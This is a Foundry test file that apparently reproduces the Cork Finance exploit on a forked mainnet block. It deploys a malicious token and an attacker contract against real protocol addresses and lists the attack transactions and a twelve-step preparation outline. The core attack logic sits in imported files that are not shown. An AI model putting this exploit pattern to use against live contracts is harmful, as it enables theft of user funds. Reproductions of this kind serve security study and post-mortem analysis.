// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import "./Interfaces.sol";
import "./AttSC_1.sol";
import "./MTK.sol";

contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
    ICorkHook corkHook = ICorkHook(0x5287E8915445aee78e10190559D8Dd21E0E9Ea88);
    address exchangeRateProvider = 0x7b285955DdcbAa597155968f9c4e901bb4c99263;
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 weETH5CT = IERC20(0xD7CAc118c007E6427ABD693e193E90a6918ce404);
    IPSMProxy flashSwapProxy = IPSMProxy(0x55B90B37416DC0Bd936045A8110d1aF3B6Bf0fc3);
    IPSMProxy psmProxy = IPSMProxy(0xCCd90F6435dd78C4ECCED1FA4db0D7242548a2a9);

    // Declaring a malicious MTK (MyToken)
    IMyToken internal mtk;

    // Exploiter's EOA (address(this) in the test context)
    address internal EXPLOITER_EOA;
    // Attacker's Smart Contract 1 - deployed by the exploiter
    AttackerSC_1 internal attSC_1;

    function setUp() external {
        string memory RPC_URL = "RPC_URL";
        EXPLOITER_EOA = address(this);
        // Several transactions were involved in this attack.
        // These three are being investigated on this reproduction:
        // 1: 0x14cdf1a643fc94a03140b7581239d1b7603122fbb74a80dd4704dfb336c1dec0 (get LP Tokens)
        // 2: 0x89ba58edaf9f40dc0c781c40351ba392be31263faa6be3a29c2ee152f271df6d
        // 3: 0xfd89cdd0be468a564dd525b222b728386d7c6780cf7b2f90d2b54493be09f64d (main attack)

        // We pin one block before the first transaction to analyze if they are strictly needed.
        cheat.createSelectFork(vm.envString(RPC_URL), 22_580_951);

        // 1.1. Deploy malicious MTK and Attck1 Instances
        mtk = new MyToken();

        attSC_1 = new AttackerSC_1(
            address(mtk),
            address(wstETH),
            address(weETH5CT),
            address(corkHook),
            address(psmProxy),
            address(flashSwapProxy),
            exchangeRateProvider
        );

        // Required to step
        deal(address(wstETH), EXPLOITER_EOA, 10e18); // Ensure exploiter has wstETH
        wstETH.approve(address(attSC_1), 10e18); // Exploiter approves AttSC_1

        // Balance tracking setup for all relevant addresses and tokens
        addTokenToTracker(address(mtk));
        addTokenToTracker(address(wstETH));
        addTokenToTracker(address(weETH5CT));
        updateBalanceTracker(EXPLOITER_EOA);
        updateBalanceTracker(address(attSC_1));
        updateBalanceTracker(address(corkHook));
    }

    function test_triggerAttack() external {
        console.log(block.number);
        attSC_1.attack();
    }

    /*
        Preparations made on 1: 0x14cdf1a643fc94a03140b7581239d1b7603122fbb74a80dd4704dfb336c1dec0
        1. Deploy malicious MTK (MyToken)
        2. Get type(uint256).max MTKs to AttSC_1
        3. Approve CorkHook to spend all AttSC_1 MTK's
        4. Transfer sequentially 0, 1e18, 2e18, ... , 9e18 to CorkHook, scoping the rate in between
        4.1 Pair id to get the rate: 0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a
        5. lidoWstETH.transferFrom sender (exploiter EOA) to AttSC_1 the sum of 10e18 
            (req prev approval and balance)
        6. Approve wstETH to Cork's Proxy and call swapRaforDs
        7. Reset wstETH approvals and grant again type(uint256).max to the same Cork's proxy.
        8. Deposit into proxy's PSM with depositPSM
        9. Reset wstETH approval to proxy back to zero, approve wstETH and weETH5CT to CorkHook
        10. Call CorkHook.addLiquidity providing wstETH as Ra and weETH5CT as Ct
        11. Reset both approvals
        12. Transfer all the LP and wstETH balance to exploiter's EOA
    */
}
